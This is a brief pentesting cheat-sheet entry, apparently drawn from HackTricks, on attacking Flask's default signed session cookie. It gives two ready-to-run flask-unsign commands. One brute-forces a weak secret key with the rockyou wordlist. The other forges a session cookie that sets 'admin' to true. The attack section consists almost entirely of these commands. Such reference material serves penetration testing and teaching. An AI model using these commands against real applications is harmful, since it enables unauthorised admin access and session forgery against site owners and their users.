
# Informations

- Default session's cookie's name : `session`
- Default session's cookie's format : JWT signed with the Flask secret key

# Weak Secret Key

**Bruteforce secret key**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie "JWT_HERE" --no-literal-eval
```

**Craft a new session cookie**
```bash
flask-unsign --sign --cookie "{'admin': 'true', 'username':'guest'}" --secret 's3cre3t'
```

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask
